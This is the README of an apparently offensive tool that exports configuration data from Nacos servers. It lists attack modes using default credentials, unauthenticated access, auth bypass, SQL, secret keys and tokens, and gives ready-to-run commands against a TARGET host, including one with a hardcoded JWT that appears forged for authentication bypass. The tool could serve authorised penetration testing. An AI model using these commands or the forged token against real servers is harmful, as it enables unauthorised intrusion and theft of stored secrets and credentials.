# NACOS EXPORT

## Feature

- ✅ 通过nacos账号密码导出配置
- ✅ 通过secretkey导出配置
- ✅ 通过token导出配置
- ✅ 通过unauth/bypass导出配置
- ✅ 导出配置数量统计
- ✅ 通过sql导出配置

## Use

考虑到NACOS部署方式不同，在设置目标路径时，指向 `/v1`的上一级目录.

> 若要将结果保存至文件，请通过重定向输出方式

```text
$ python3.11 nacos-export.py -h
usage: nacos-export.py [-h] [-u USERNAME] [-p PASSWORD] [-t TOKEN] [-sk SECRETKEY] [--proxy PROXY] url method

 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: v1.4.1
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |       
                ||     ||

positional arguments:
  url                   NACOS url, before '/v1'
  method                Choice method, {login, bypass|unauth, sql, token, secretkey}

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        NACOS username
  -p PASSWORD, --password PASSWORD
                        NACOS password
  -t TOKEN, --token TOKEN
                        token
  -sk SECRETKEY, --secretkey SECRETKEY
                        secretkey
  --proxy PROXY         proxy like: http://127.0.0.1:8080
```

## Nuclei Template

- **nacos-default-login**
  - `python3 nacos-export.py http://TARGET:8848/nacos login -u nacos -p nacos`
- **unauthenticated-nacos-access**
  - `python3 nacos-export.py http://TARGET:8848/nacos unauth`
  - `python3 nacos-export.py http://TARGET:8848/nacos bypass`
- **nacos-auth-bypass**
  - `python3 nacos-export.py http://TARGET:8848/nacos unauth`
  - `python3 nacos-export.py http://TARGET:8848/nacos bypass`
- **nacos-authentication-bypass:extracted-credentials**
  - `python3 nacos-export.py http://TARGET:8848/nacos token -t eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g`
